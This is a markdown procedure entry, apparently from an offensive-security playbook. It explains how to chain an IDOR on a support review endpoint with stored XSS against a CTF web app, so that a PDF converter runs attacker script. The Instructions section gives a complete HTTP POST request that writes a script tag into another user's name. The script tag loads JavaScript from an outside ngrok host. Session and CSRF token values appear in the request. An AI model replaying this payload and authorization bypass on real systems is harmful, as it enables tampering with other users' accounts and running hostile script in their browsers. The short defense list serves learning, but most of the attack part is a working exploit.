---
tags:
  - idor
  - xss-injection
type: procedure
tools:
  - '[[tools/ngrok]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/post-support-review-idor]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T04:39:10.018Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: ef5b92ef-46d5-4b99-969c-16f584d88efe
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# IDOR-to-Inject-XSS-into-User-Name-for-PDF-Converter

## Summary

This procedure exploits an Insecure Direct Object Reference (IDOR) in the support review endpoint to update any user's name with an unsanitized XSS payload, which later triggers in the PDF converter template, allowing arbitrary JS execution in the converter context.

## Description

The /support/review/{review_id} endpoint accepts a user_id parameter without authorization checks, allowing attackers to specify any user_id (e.g., 18). The 'name' field lacks sanitization for <>{} characters, so injecting a script tag loads external JS from an ngrok-hosted file. When the target user accesses the PDF converter (/converter/{doc_id}.png?user_name=), the name is rendered unsafely in an <h3> tag, executing the XSS.

## Requirements

1. Valid session and CSRF token from a logged-in account
2. Knowledge of target user_id (e.g., 18)
3. Ngrok server hosting new.js for the script src
4. Review ID from prior chat interaction

## Defense

Defensive measures and detection strategies:

- Implement proper authorization checks on user_id parameters
- Sanitize and escape all user inputs rendered in templates
- Use Content Security Policy to block inline scripts in converter
- Audit endpoints for IDOR by enforcing session-user matching

## Objectives

1. Unauthorized update of target user's name
2. Inject persistent XSS payload
3. Trigger XSS in PDF converter for further exploitation

## Instructions

### Step 1: Obtain Review ID and CSRF Token

**Context**: From a previous support chat, get the review_id and extract _csrf_token from cookies.

Inspect network or session.

> Example: review_id=efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587, token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee

### Step 2: Craft and Send POST Request

**Context**: Use [[commands/post-support-review-idor]] to update name with XSS for target user_id=18.

```http
POST /support/review/efe74fb38a69eae74f733a3e035edf33ed14f34af0755495ff6abae219155587 HTTP/1.1
Host: h1-415.h1ctf.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://h1-415.h1ctf.com/support/review/88cdddff2719525210a5cdc95f3cf7f14c83f6e44caf87f5ec4255a9f69e35eb
Content-Type: application/x-www-form-urlencoded
Content-Length: 135
Origin: https://h1-415.h1ctf.com
Connection: close
Cookie: _csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee; session=eyJfY3NyZl90b2tlbiI6IjQ2Y2I4YTYyYzNjOTliNWQ1YTJjMDQ1YmFlY2Y5MDM5MjE2YTNjZWUifQ.Xikx5g.KDxEtKJxN1cDleoMbr6adoqpgCs
Upgrade-Insecure-Requests: 1

name=<script src="https://8a7b2695.ngrok.io/static/js/new.js"></script>&user_id=18&_csrf_token=46cb8a62c3c99b5d5a2c045baecf9039216a3cee
```

> 200 OK indicates successful update.

### Step 3: Verify Injection

**Context**: Check target user's profile or trigger converter.

Access /converter with user_name param.

> XSS payload renders and executes.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/post-support-review-idor]]

## Tools Used

- [[tools/ngrok]]

## Tags

- idor
- xss
- user-data-manipulation
